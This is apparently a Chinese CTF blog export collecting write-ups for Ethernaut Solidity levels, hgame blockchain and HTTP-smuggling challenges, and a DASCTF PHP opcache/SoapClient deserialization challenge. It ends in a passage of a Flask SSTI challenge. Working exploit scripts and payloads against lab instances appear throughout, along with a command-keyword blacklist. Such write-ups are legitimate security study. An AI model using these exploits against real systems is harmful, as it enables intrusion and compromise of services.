[{"title":"Ethernaut-刷题小记（二）","url":"/2025/03/18/Ethernaut-刷题小记（二）/","content":"\n# Ethernaut刷题小记（二）\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport \"@openzeppelin/contracts/math/SafeMath.sol\";\n\ncontract Fallout {\n    using SafeMath for uint256;\n\n    mapping(address => uint256) allocations;\n    address payable public owner;\n\n    /* constructor */\n    function Fal1out() public payable {\n        owner = msg.sender;\n        allocations[owner] = msg.value;\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"caller is not the owner\");\n        _;\n    }\n\n    function allocate() public payable {\n        allocations[msg.sender] = allocations[msg.sender].add(msg.value);\n    }\n\n    function sendAllocation(address payable allocator) public {\n        require(allocations[allocator] > 0);\n        allocator.transfer(allocations[allocator]);\n    }\n\n    function collectAllocations() public onlyOwner {\n        msg.sender.transfer(address(this).balance);\n    }\n\n    function allocatorBalance(address allocator) public view returns (uint256) {\n        return allocations[allocator];\n    }\n}\n```\n\n第二关没啥东西，就是因为合约名字是`Fallout`，而构造函数叫做`Fal1out`，因为这个错误，当合约被部署时，构造函数在创建时从未被执行，owner自然也没有更新，因为`Fal1out`被当作一个普通函数了，从而我们可以多次调用，并且调用一次，合约所有者就是我们自己了。\n\n> *在 Solidity 0.4.22 之前，为一个合约定义构造函数的唯一方法是定义一个与合约本身同名的函数。*    \n>\n> 在该版本之后，他们引入了一个新的`constructor`关键字来避免这种错误。*    \n>\n> *在这个例子中，开发者犯了一个错误，把构造函数的名字弄错了。*    \n>\n> *Contract name -> Fallout*    *// Constructor name -> Fal1out*    *// 这样做的结果是，合约从未被初始化，所有者是地址(0)*    \n>\n> *而且我们能够调用`Fal1out`函数，在这一点上，它不是一个构造函数（只能调用一次），而是一个 \"普通\"函数。*    \n>\n> *这也意味着任何人都可以多次调用这个函数来切换合约的所有者。*\n\n通关条件就是拿到owner\n\n接着开始第三关\n\n```json\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract CoinFlip {\n    uint256 public consecutiveWins;\n    uint256 lastHash;\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n    constructor() {\n        consecutiveWins = 0;\n    }\n\n    function flip(bool _guess) public returns (bool) {\n        uint256 blockValue = uint256(blockhash(block.number - 1));\n\n        if (lastHash == blockValue) {\n            revert();\n        }\n\n        lastHash = blockValue;\n        uint256 coinFlip = blockValue / FACTOR;\n        bool side = coinFlip == 1 ? true : false;\n\n        if (side == _guess) {\n            consecutiveWins++;\n            return true;\n        } else {\n            consecutiveWins = 0;\n            return false;\n        }\n    }\n}\n```\n\n分析合约\n\n我们需要连续猜对十次硬币的正反面才能通关\n\n通过分析合约可以确定`_guess=uint256(blockhash(block.number.sub(1))).div(57896044618658097711785492504343953926634992332820282019728792003956564819968)`，那我们不就已经知道怎么去预测了吗，取当前区块的 **前一个区块**（`block.number - 1`）的 **哈希值**，并将其转换成 `uint256` 类型。使用 `blockhash(block.number - 1)` 生成**随机性**\n\n直接上攻击代码（代码来自9C±Void师傅）\n\n```json\n/// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\nimport './Level3.sol';\n\ncontract CoinFlipAttack{\n    address target_addr;\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n    uint256 lastHash;\n\n    constructor(){\n        target_addr = 攻击合约地址;\n    }\n    function attack() public{\n        uint256 blockValue = uint256(blockhash(block.number-1));\n\n        lastHash = blockValue;\n        uint256 coinFlipResult = blockValue / FACTOR;\n        bool side = coinFlipResult == 1 ? true : false;\n\n        CoinFlip(target_addr).flip(side);\n    }\n}\n```\n\n> 1. 区块链上的所有东西都是公开的，即便是像 \"lastHash \"和 \"FACTOR \"这样的私有变量；\n> 2. 区块链中没有真正的 \"原生\" 随机性，而只有 \"伪随机性\"。\n\n~~一开始我是写了一个循环的，但是发现需要停几秒,因为要等`lastHash = blockValue`，但是合约代码是没有暂停这个功能的,只能作罢~~","tags":["blockchain solidity"]},{"title":"Ethernaut_刷题小记（一）","url":"/2025/03/12/Ethernaut-刷题小记（一）/","content":"\n# Ethernaut_刷题小记（一）\n\n本人所有题目是把它拉到Remix VM里面做的，效果都是一样。\n\n拿到合约代码，目标是要求获得`Fallback`合约的所有权，并将其余额减少到0。\n\n```json\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Fallback {\n    mapping(address => uint256) public contributions;\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n        contributions[msg.sender] = 1000 * (1 ether);\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"caller is not the owner\");\n        _;\n    }\n\n    function contribute() public payable {\n        require(msg.value < 0.001 ether);\n        contributions[msg.sender] += msg.value;\n        if (contributions[msg.sender] > contributions[owner]) {\n            owner = msg.sender;\n        }\n    }\n\n    function getContribution() public view returns (uint256) {\n        return contributions[msg.sender];\n    }\n\n    function withdraw() public onlyOwner {\n        payable(owner).transfer(address(this).balance);\n    }\n\n    receive() external payable {\n        require(msg.value > 0 && contributions[msg.sender] > 0);\n        owner = msg.sender;\n    }\n}\n```\n\n审计这个代码，我们可以看到有两个函数涉及到了owner的分配\n\n```json\nfunction contribute() public payable {\n        require(msg.value < 0.001 ether);\n        contributions[msg.sender] += msg.value;\n        if (contributions[msg.sender] > contributions[owner]) {\n            owner = msg.sender;\n        }\n    }\n```\n\n```json\nreceive() external payable {\n        require(msg.value > 0 && contributions[msg.sender] > 0);\n        owner = msg.sender;\n    }\n```\n\n第一个成为owner的条件是要搞到1000eth（`contributions[msg.sender] = 1000 * (1 ether);`）。。。。显然有点。。。十分不可能！！\n\n而第二个，就是只要存款大于0就能成为owner，那我们固然选择后者\n\n选择后者就是看怎么样调用它了\n\nSolidity文档中对receive的描述\n\n> 一个合约最多可以有一个 `receive` 函数，声明为 `receive() external payable { ... }` （不带 `function` 关键字）。 该函数不能有参数，不能返回任何内容，必须具有 `external` 可见性和 `payable` 状态可变性。 它可以是虚拟的，可以重写，并且可以有 修改器modifier。\n>\n> 接收函数在调用合约时执行，且没有提供任何 calldata。\n\n对fallback函数的描述\n\n> 一个合约最多可以有一个 `fallback` 函数，声明为 `fallback () external [payable]` 或 `fallback (bytes calldata input) external [payable] returns (bytes memory output)` （两者均不带 `function` 关键字）。\n>\n> 该函数必须具有 `external` 可见性。回退函数可以是虚拟的，可以重写，并且可以有修改器。\n>\n> 如果没有其他函数与给定的函数签名匹配，或者根本没有提供数据且没有 [接收以太函数](https://learnblockchain.cn/docs/solidity/contracts.html#receive-ether-function)，、则在调用合约时执行回退函数。 回退函数始终接收数据，但为了接收以太币，它必须标记为 `payable`。\n\n而函数withdraw()是可以清空余额的\n\n```json\nfunction withdraw() public onlyOwner {\n        payable(owner).transfer(address(this).balance);\n    }\n```\n\n那我们的思路就很明了了，先用`contribute`，给点当前用户余额，然后我们设置一个不为0的value的值，再将calldata置为空发送交易就可以让owner变成我们了~，再调用withdraw函数清空，这关就挑战完成了\n\n\n\n那你可能会有一个疑惑，为什么没有用到fallback函数，但是有点文章却说fallback是考点呢？其实最初版本是用到的下面的这个源码\n\n```\npragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract Fallback {\n\n  using SafeMath for uint256;\n  mapping(address => uint) public contributions;\n  address payable public owner;\n\n  constructor() public {\n    owner = msg.sender;\n    contributions[msg.sender] = 1000 * (1 ether);\n  }\n\n  modifier onlyOwner {\n        require(\n            msg.sender == owner,\n            \"caller is not the owner\"\n        );\n        _;\n    }\n\n  function contribute() public payable {\n    require(msg.value < 0.001 ether);\n    contributions[msg.sender] += msg.value;\n    if(contributions[msg.sender] > contributions[owner]) {\n      owner = msg.sender;\n    }\n  }\n\n  function getContribution() public view returns (uint) {\n    return contributions[msg.sender];\n  }\n\n  function withdraw() public onlyOwner {\n    owner.transfer(address(this).balance);\n  }\n\n  fallback() external payable {\n    require(msg.value > 0 && contributions[msg.sender] > 0);\n    owner = msg.sender;\n  }\n}\n```\n\n就是利用的fallback函数哦~，在calldata为空的情况下，fallback和receive是等价的！\n","tags":["blockchain"]},{"title":"Level_729_易画行-复现","url":"/2025/02/21/Level-729-易画行-复现/","content":"\n# hgame 易画行复现\n\n> 此题是为了让⼤家稍微了解⼀下区块链。需要的知识是区块链的⼀些基本知识和ipfs的⼀些知识。\n\n这道题确实不难，可惜我没有认真学Blockchain，做这个题也没有投入精力，只是看了看，赛后9C±Void师傅给我写了一份解析，在此致谢！\n\n题目给了一个Typescript文件\n\n```ts\nimport { ethers } from 'ethers';\nimport config from './config.json';\n\nconst abi = [\n  'function safeTransferFrom(address from, address to, uint256 tokenId) external',\n  'function approve(address to, uint256 tokenId) external',\n  'function getApproved(uint256 tokenId) external view returns (address)',\n  'function ownerOf(uint256 tokenId) external view returns (address)',\n];\n\nasync function transferNFT(tokenId: number, toAddress: string) {\n  const provider = new ethers.JsonRpcProvider('https://sepolia.drpc.org');\n  const wallet = new ethers.Wallet(config.privateKey, provider);\n\n  if (wallet.address.toLowerCase() !== config.fromAddress.toLowerCase()) {\n    throw new Error('私钥与发送方地址不匹配');\n  }\n\n  const nftContract = new ethers.Contract(config.nftAddress, abi, wallet);\n\n  try {\n    console.log('开始转移NFT...');\n    const tx = await nftContract.safeTransferFrom(\n      config.fromAddress,\n      toAddress,\n      tokenId\n    );\n\n    console.log('等待交易确认...');\n    const receipt = await tx.wait();\n    console.log(`NFT转移成功! 交易哈希: ${receipt.hash}`);\n\n    return receipt;\n  } catch (error) {\n    console.error('转移NFT时发生错误:', error);\n    throw error;\n  }\n}\n\nconst tokenId = 1;\nconst toAddress = '0x74520Ad628600F7Cc9613345aee7afC0E06EFd84';\n\ntransferNFT(tokenId, toAddress)\n  .then(() => console.log('转移完成'))\n  .catch(console.error);\n\n```\n\n代码使用 `ethers.js` 进行智能合约交互，代码中使用了`ethers.JsonRpcProvider('https://sepolia.drpc.org')`，意味着这个脚本是连接**Sepolia 测试网**，并有NFT转移的操作，最后告诉了我们转移的NFT的TokenID和NFT接收方的地址，因此我们肯定是要从接收方地址开始下手。\n\n用Etherscan浏览器搜索，不过是测试网，所以用这个https://sepolia.etherscan.io/\n\n![image-20250221205422018](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202502212054413.png)\n\n看到那个Vidar的NFT，获取NFT的 tokenURI 有2种做法\n\n## 两种解法\n\n### 第一种：纯粹的溯源\n\n##### 点击右下那个 NFT: Vidar#1 我们能进入\n\n> 下面一共就只有铸\n>\n> 造（Mint）和转移（Transfer）两个操作，而一般来说对于一个NFT而言，它的Metadata只会在铸造的\n>\n> 时候进行设定，之后它的Metadata将不再发生改变，因此我们需要查看它的铸造操作\n\n![image-20250221205858451](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202502212058519.png)\n\n我们点击最下面那个\n\n##### 进入对应的交易详情页面，在Logs里面看到合约emit了MetadataUpdate事件，说明这个交易中的确发生了Metadata的改变\n\n![image-20250221210227181](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202502212104661.png)\n\n![image-20250221210359382](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202502212104679.png)\n\n##### 改变的数据我们可以直接查看交易中的 Input Data 栏，点击 Decode Input Data 我们就能够看到修改的tokenURI是什么了\n\n![image-20250221210625006](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202502212239885.png)\n\n![image-20250221210727735](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202502212107842.png)\n\n##### 用ipfs desktop打开ipfs地址\n\n![image-20250221220537786](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202502212205514.png)\n\n不下载这个也可，访问这个https://ipfs.io/ipfs/(Link Hash)\n\n### 第二种：合约调用\n\n这个是9C±Void师傅写的脚本~~，本人太菜，入门程度都未到~~\n\n```python\nfrom web3 import Web3\n\n# Configuration\nRPC_URL = \"https://sepolia.drpc.org\"\nNFT_ADDRESS = \"0x0c5ABBB0743a3Ac77C2c301eD63810F3353c59F8\"\n\n# 初始化 Web3 连接\nw3 = Web3(Web3.HTTPProvider(RPC_URL))\n\n# 检查连接是否成功\nif not w3.is_connected():\n    raise ConnectionError(\"无法连接到以太坊节点，请检查 RPC URL\")\n\n# 合约 ABI\nABI = [\n    {\n        \"inputs\": [\n            {\"internalType\": \"uint256\", \"name\": \"tokenId\", \"type\": \"uint256\"},\n        ],\n        \"name\": \"tokenURI\",\n        \"outputs\": [{\"internalType\": \"string\", \"name\": \"\", \"type\": \"string\"}],\n        \"stateMutability\": \"view\",  # 修正为 view\n        \"type\": \"function\",\n    },\n]\n\n# 绑定合约\nnft = w3.eth.contract(address=NFT_ADDRESS, abi=ABI)\n\n# 调用 tokenURI 方法\ntoken_id = 1\ntry:\n    uri = nft.functions.tokenURI(token_id).call()\n    print(f\"Token {token_id} URI: {uri}\")\nexcept Exception as e:\n    print(f\"调用 tokenURI 失败: {e}\")\n\n```\n\n![image-20250221221140796](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202502212211911.png)\n\n接下来就和上面一样了\n\n> 有关上面的MetadataUpdate事件，这个事件来自EIP5008: ERC-721 Nonce and Metadata\n>\n> Update Extension - EIPs - Fellowship of Ethereum Magicians，直接去官网上看EIP-5008的话只\n>\n> 会看到它对Nonce拓展的定义，但是官网给出了通往上面这个链接的跳转\n\n参考：[ERC-721：非同质化代币标准](https://eips.ethereum.org/EIPS/eip-721)","tags":["智能合约"]},{"title":"不存在的车厢复现","url":"/2025/02/19/不存在的车厢复现/","content":"\n# 2025 hgame-不存在的车厢复现\n\n官方WP思路如下：\n\n![image-20250219131123627](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202502191311489.png)\n\n题目给了源码，分析代码可得\n\n![image-20250219131301665](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202502191313910.png)\n\n开放的是8081端口\n\n![image-20250219131343825](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202502191313777.png)\n\nflag在8080端口\n\n当我们用GET方式访问，会得到Welcome to HGAME 2025响应，用POST的话，代理会直接拒绝，做题时，想到了用走私通过8081端口走私8080拿到flag，但是看不明白request.go，没想到整数溢出，这道题确实受益匪浅\n\n#### 分析request.go\n\n##### 写入函数分析\n\n这段 Go 代码实现了一个自定义的 **H111** 请求协议，能够序列化（写入）和反序列化（读取）`http.Request`。它包含两个核心函数：\n\n1. `ReadH111Request(reader io.Reader) (*http.Request, error)`\n   **从二进制流读取数据，并构造 HTTP 请求**\n2. `WriteH111Request(writer io.Writer, req *http.Request) error`\n   **将 HTTP 请求序列化为二进制数据流**\n\n在 `WriteH111Request()` 里，数据长度是这样写入的：\n\n```go\nbinary.Write(writer, binary.BigEndian, uint16(len(methodBytes)))\n```\n\n如果 `methodBytes` 长度 **意外超过 65535**，例如：\n\n```go\nmethodBytes := make([]byte, 65536) // 长度 = 65536\nbinary.Write(writer, binary.BigEndian, uint16(len(methodBytes))) \n```\n\n举个例子给你们看\n\n```go\npackage main\n\nimport \"fmt\"\n\nfunc main() {\n\tvar num1 int = 65536\n\tvar num2 int = 65537\n\tvar num3 int = 65538\n\tvar num4 int = 131072\n\n\tfmt.Println(\"uint16(65536):\", uint16(num1))  // 65536 溢出，变成 0\n\tfmt.Println(\"uint16(65537):\", uint16(num2))  // 65537 溢出，变成 1\n\tfmt.Println(\"uint16(65538):\", uint16(num3))  // 65538 溢出，变成 2\n\tfmt.Println(\"uint16(131072):\", uint16(num4)) // 131072 溢出，变成 0\n}\n\n```\n\n输出就是\n![image-20250219140558300](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202502191405396.png)\n\n##### 读取函数分析\n\n在 `ReadH111Request()` 里，数据是按 `Len+Data` 方式解析的：\n\n```go\nvar methodLength uint16\nbinary.Read(reader, binary.BigEndian, &methodLength)\n\nmethod := make([]byte, int(methodLength))\n_, err := io.ReadFull(reader, method)\n```\n\n如果 `methodLength == 0x0000`（因为 `65536` 溢出到 `0`），则：\n\n- **`make([]byte, 0)`** 创建的是空数组。\n- `io.ReadFull(reader, method)` 直接跳过 `method` 的读取。\n- **方法字段的数据仍然存在流中，但没有被解析，导致后续数据错位，从而保留我们的POST请求！**\n\n当 `bodyLength == 0`，但实际 `65519` 个字节仍然在 TCP 流里。\n\n#### 分析main.go\n\n处理客户端连接使用了无限for循环\n\n```go\nfor {\n\tconn, err := listener.Accept()\n\tif err != nil {\n\t\tlog.Println(err)\n\t\tcontinue\n\t}\n\tgo serverH111(conn)\n}\n\nfunc serverH111(conn net.Conn) {\n\tdefer conn.Close()\n\tfor {\n\t\treq, err := h111.ReadH111Request(conn)\n\t\tif err != nil {\n\t\t\tlog.Println(err)\n\t\t\treturn\n\t\t}\n\t\trecorder := httptest.NewRecorder()\n\t\tmux.ServeHTTP(recorder, req)\n\t\tresp := recorder.Result()\n\t\tlog.Printf(\"Received request %s %s, response status code %d\", req.Method, req.URL.Path, resp.StatusCode)\n\t\terr = h111.WriteH111Response(conn, resp)\n\t\tif err != nil {\n\t\t\tlog.Println(err)\n\t\t\treturn\n\t\t}\n\t}\n}\n\n```\n\n`for {}` 无限循环，不断接受新的连接。\n\n#### 分析反向代理main.go\n\n```go\nfunc main() {\n\tpool = sync.Pool{\n\t\tNew: func() interface{} {\n\t\t\tfor {\n\t\t\t\tconn, err := net.Dial(\"tcp\", \"127.0.0.1:8080\")\n\t\t\t\tif err != nil {\n\t\t\t\t\tfmt.Println(\"error dialing to backend server\")\n\t\t\t\t\ttime.Sleep(time.Millisecond * 300)\n\t\t\t\t\tcontinue\n\t\t\t\t}\n\t\t\t\treturn conn\n\t\t\t}\n\t\t},\n\t}\n\thttp.ListenAndServe(\":8081\", &proxyHandler{})\n}\n\n```\n\n**`sync.Pool{ New: func() { ... } }`**\n\n- 定义了连接池的 `New` 函数：**当连接池为空时，会创建一个新的 TCP 连接**。\n\n**使用 `sync.Pool` 作为连接池，优化 TCP 连接复用，我们可以利用这一点**\n\n#### 实施攻击\n\n根据上面的分析，我们的攻击思路就是通过构造一个长度等于65536的GET请求，通过溢出归0，走私我们的POST请求\n\n官方WP是用的yakit发包，我用到yakit比较少，写了个脚本\n\n![image-20250219151908490](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202502191519027.png)\n\n\n\n脚本：\n\n```python\nimport socket\nimport struct\n\ndef build_h111_request():\n    method = b'POST'\n    uri = b'/flag'\n    headers = {}  # 无请求头\n    body = b''    # 空请求体\n\n    data = b''\n    # 方法部分\n    data += struct.pack('>H', len(method))  # 方法长度（大端序2字节）\n    data += method                          # 方法内容\n    # URI部分\n    data += struct.pack('>H', len(uri))     # URI长度\n    data += uri                             # URI内容\n    # 请求头部分\n    data += struct.pack('>H', len(headers)) # 请求头数量\n    for key, values in headers.items():     # 遍历每个请求头（此处无）\n        key_bytes = key.encode()\n        data += struct.pack('>H', len(key_bytes))\n        data += key_bytes\n        for value in values:\n            value_bytes = value.encode()\n            data += struct.pack('>H', len(value_bytes))\n            data += value_bytes\n    # 请求体部分\n    data += struct.pack('>H', len(body))    # 请求体长度\n    data += body                            # 请求体内容\n\n    return data\n\nh111_request = build_h111_request()  # 返回字节串\nprint(h111_request)\n\nlength1 = len(h111_request)\nlength2 = 65536 - length1\nh111_request = h111_request + length2 * b'0'  # 使用字节而不是字符\nprint(len(h111_request))\n\ndef build_http_request(full_body):\n    \"\"\"\n    构造最终的 HTTP 请求\n    \"\"\"\n    request_line = b\"GET /flag HTTP/1.1\\r\\n\"\n    headers = (\n        b\"Host: node1.hgame.vidar.club:31772\\r\\n\" +\n        b\"Content-Length: \" + str(len(full_body)).encode() + b\"\\r\\n\" +\n        b\"\\r\\n\"\n    )\n    if isinstance(full_body, str):\n        full_body = full_body.encode()  # 如果是字符串类型，转换为字节串\n    http_request = request_line + headers + full_body\n    return http_request\n\nhttp_request = build_http_request(h111_request)\nprint(http_request)\n\nhost = \"node1.hgame.vidar.club\"\nport = 31772\n\nwith socket.create_connection((host, port)) as s:\n    s.sendall(http_request)\n    response = b\"\"\n    s.settimeout(5)  # 设置更长的超时时间\n    while True:\n        try:\n            data = s.recv(4096)\n            if not data:\n                break\n            response += data\n        except socket.timeout:\n            print(\"Connection timed out!\")\n            break\n    print(response.decode())\n\n```\n\n![image-20250219201613565](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202502192016065.png)\n\n脚本需要多执行几次保持复用","tags":["http走私"]},{"title":"0psu3十一月挑战赛｜越艰巨·越狂热]single_php复现","url":"/2025/01/20/0psu3十一月挑战赛｜越艰巨·越狂热-single-php复现/","content":"\n## [DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热]single_php复现\n\n![image-20250110171833140](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101718813.png)\n\n进题如上\n\n传参highlight_file,拿到源码\n\n```\n<!DOCTYPE html>\n <html>\n <head>\n <style>\n img {\n max-width: 200px;\n max-height: 200px;\n }\n </style>\n <title>revenge to siranai.php\n \n \n </title>\n \n </head>\n <body>\n \n <h5>\n This is my wife.She is from Imagination.\n And I,use her name as my id.\n </h5>\n <img src=\"mywife.png\" alt=\"this is my wife\">\n <p>I have been single dog for 19 years.<br>\n One day, my brothers betrayed the singles organization.<br>\n S* and B* ,both of them have the kanozyo.<br>\n Now revenge to them!!!!!<br>\n use '$_GET['LuckyE'](__FILE__);' to begin your revenge!!<br>\n </p>\n </body>\n </html>\n <?php\n error_reporting(0);\n class siroha{\n public $koi;\n \n public function __destruct(){\n $this->koi['zhanjiangdiyishenqing']();\n }\n }\n $kanozyo = $_GET['LuckyE'](__FILE__);\n var_dump($kanozyo);\n $suki = unserialize($_POST['suki']); \n```\n\n得到提示，revenge to siranai.php\n\n![image-20250110172256406](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101722996.png)\n\nemm，看起来得打[Soap](https://cloud.tencent.com/developer/article/1878220)反序列化\n\n回到原先的反序列化的页面\n\n搞一个phpinfo看看\n\n![image-20250110172906287](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101729720.png)\n\n![image-20250110173851522](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101738478.png)\n\n这个缓存是放在了/tmp目录下并有时间戳验证，可以先了解[opcache执行php代码](https://xz.aliyun.com/t/223?time__1311=eqIx0DyGG%3DemqAKqGNSDrDRmhiRRou2bD)\n\n那整体的思路应该就是上传我们的恶意压缩包，对原本的缓存文件进行覆盖，变成我们的恶意文件\n\n本地拉取相同版本php的镜像，用脚本进行伪造时间戳\n\n本人代码能力有限，直接使用官方WP的代码\n\n```python\nimport binascii\nimport hashlib\nimport requests\nimport re\nimport tarfile\nimport subprocess\nimport os\nurl = \"http://97ed25bf-fecf-4710-bd78-9e313a784c29.node5.buuoj.cn:81/?LuckyE=filectime\"\ndef timec():\n    pattern = r\"\\d{10}\"  #匹配十位数字\n    timeres = requests.get(url=url)\n    match = re.search(r\"int\\((\\d{10})\\)\",timeres.text)#从响应包中提取到时间戳信息\n    try:\n        ten_digit_number = match.group(1)\n        print(ten_digit_number)\n        return ten_digit_number  #返回时间戳\n    except:\n        print('dame')\n\ndef split_string_into_pairs(input_string):\n    if len(input_string) % 2 != 0:\n        raise ValueError(\"输入字符串的长度必须是偶数\")\n    pairs = [input_string[i:i+2] for i in range(0, len(input_string), 2)]\n    return pairs\n\ndef totime(time):\n    b = split_string_into_pairs(f\"{hex(int(time))}\")\n    b.pop(0)\n    s = ''\n    for i in range(0, len(b)):\n        s += b[-1]\n        b.pop(-1)\n    return s\ndef changetime():\n    with open(\"index.php.bin\",\"rb\") as file:\n        binary_data = file.read()\n        # 将二进制数据转换为十六进制字符串\n        hex_data = binascii.hexlify(binary_data).decode('utf-8')\n        new_data = hex_data[0:128]+totime(timec())+hex_data[136:]\n        with open(\"index.php.bin\",\"wb\") as f:\n            f.write(bytes.fromhex(new_data))\nchangetime()\nsys_id = hashlib.md5(\"8.2.10API420220829,NTSBIN_4888(size_t)8\\002\".encode(\"utf-8\")).hexdigest()\nprint(sys_id)\ndef tar_file():\n    tar_filename = 'exp.tar'\n    with tarfile.open(tar_filename,'w') as tar:\n        directory_info = tarfile.TarInfo(name=f'{sys_id}/var/www/html')\n        directory_info.type = tarfile.DIRTYPE\n        directory_info.mode = 0o777\n        tar.addfile(directory_info)\n        tar.add('index.php.bin', arcname=f'{sys_id}/var/www/html/index.php.bin')\ndef upload():\n    file = {\"file\":(\"exp.tar\",open(\"exp.tar\",\"rb\").read(),\"application/x-tar\")}\n    res  = requests.post(url=\"http://97ed25bf-fecf-4710-bd78-9e313a784c29.node5.buuoj.cn:81/siranai.php\",files=file)\n    print(res.request.headers)\n    return res.request\ntar_file()\nrequest_content = upload()\nupload_body = str(request_content.body).replace(\"\\\"\",\"\\\\\\\"\")\ncontent_length = request_content.headers['Content-Length']\nprint(content_length)\nprint(upload_body)\n```\n\n![image-20250110174712860](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101747887.png)\n\n封装到Soap\n\n```php\n<?php\nclass siroha\n{\n    public $koi;\n\n\n}\n\n$postdata = \"\";\ntry {\n    $a = new SoapClient(null, array('location' => \"http://127.0.0.1/siranai.php\", 'user_agent' => \"Enterpr1se\\r\\n\" . \"Cookie: PHPSESSION=16aaab9fb\\r\\nContent-Type: multipart/form-data; boundary=\" . substr($postdata, 2, 32) . \"\\r\\nConnection: keep-alive\\r\\nAccept: */*\\r\\nContent-Length: 10416\" . \"\\r\\n\\r\\n\" . $postdata,\n        'uri' => \"http://127.0.0.1/siranai.php\"));\n} catch (SoapFault $e) {\n}\n$b = new siroha();\n$b->koi = [\"zhanjiangdiyishenqing\" => [$a, \"nnnnn\"]];\n//通过数组调用类方法调用一个不存在的方法触发::__call魔术方法\necho urlencode(serialize($b));\n```\n\nBP放包\n\n![image-20250110174642997](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101746573.png)\n\n这就已经覆盖成功了，直接传参拿到flag\n\n![image-20250110175053635](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202501101750618.png)\n\n~~这题确实不好写，据说当时是零解，我现在写都不好写【大哭】~~"},{"title":"ciscn-ccb部分WP","url":"/2024/12/15/ciscn-ccb部分WP/","content":"\n# Safe_Proxy\n\n开局源码，貌似不能直接搞\n\n拉到本地直接梭\n\n```python\nfrom flask import Flask, request, render_template_string\nimport socket\nimport threading\nimport html\n\napp = Flask(__name__)\n\n@app.route('/', methods=[\"GET\"])\ndef source():\n    with open(__file__, 'r', encoding='utf-8') as f:\n        return '<pre>'+html.escape(f.read())+'</pre>'\n\n@app.route('/', methods=[\"POST\"])\ndef template():\n    template_code = request.form.get(\"code\")\n    # 安全过滤\n    blacklist = ['__', 'import', 'os', 'sys', 'eval', 'subprocess', 'popen', 'system', '\\r', '\\n']\n    for black in blacklist:\n        if black in template_code:\n            return \"Forbidden content detected!\"\n    result = render_template_string(template_code)\n    print(result)\n    return result\nif __name__ == \"__main__\":\n    